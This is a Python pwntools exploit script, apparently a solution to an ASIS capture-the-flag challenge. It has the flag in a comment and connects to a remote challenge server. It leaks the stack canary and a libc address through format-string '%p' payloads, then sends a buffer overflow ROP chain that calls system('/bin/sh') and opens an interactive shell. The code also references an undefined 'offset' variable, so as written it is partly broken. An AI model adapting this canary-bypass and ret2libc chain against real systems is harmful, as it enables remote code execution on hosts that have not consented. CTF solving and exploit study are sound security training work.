#!/usr/bin/python3

from pwn import *

#ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}


def main():

	#p = process("./chall1")
	p = remote("69.172.229.147", 9002)

	context.binary = "./chall1"

	local = 0

	if local:
		libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
	else:
		libc = ELF("./libc-2.27.so")

	p.sendline("%p %p %p %p %p %p %p %p %p %p %p %p %p %p")
	data = p.recvline().decode()
	canary = int(data.strip()[-18::], 16)


	log.info("Canary is 0x%x", canary)

	payload = "%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"
	p.sendline(payload)
	data = p.recvline().decode()
	libc_leak = data.strip()[-14-1-14::].split(" ")[-1]
	libc_leak = int(libc_leak, 16)
	log.info("Libc leak @ 0x%x", libc_leak)
	l_base = libc_leak - libc.sym["__libc_start_main"] - 243 + 12
	log.info("Libc Base @ 0x%x", l_base)

	pause()

	print("Offset = ", offset)
	one_gadget = l_base + 0xe6ce9

	PopRdi = l_base + 0x000000000002155f
	ret= l_base + 0x00000000000008aa

	log.info("POPRDI 0x%x", PopRdi)
	BinSh = p64(l_base + 0x1b3e9a)

	payload  = b'\x00'*(64+8)
	payload += p64(canary)
	payload += p64(0)
	payload += p64(PopRdi)
	payload += BinSh
	payload += p64(ret)
	payload += p64(l_base + libc.sym.system)


	#0xe6ce3 0xe6ce6 0xe6ce9 libc 2.31

	"""
	log.info("One gadget @ 0x%x", one_gadget)
	log.info("Fini dtors @ 0x%x", fini_dtors)

	write = {stack_ret: one_gadget}
	payload = fmtstr_payload(offset, write)

	print(payload)
	"""
	pause()
	p.sendline(payload)
	print("Payload len is ", len(payload))
	print("\n\n")

	p.interactive()


main()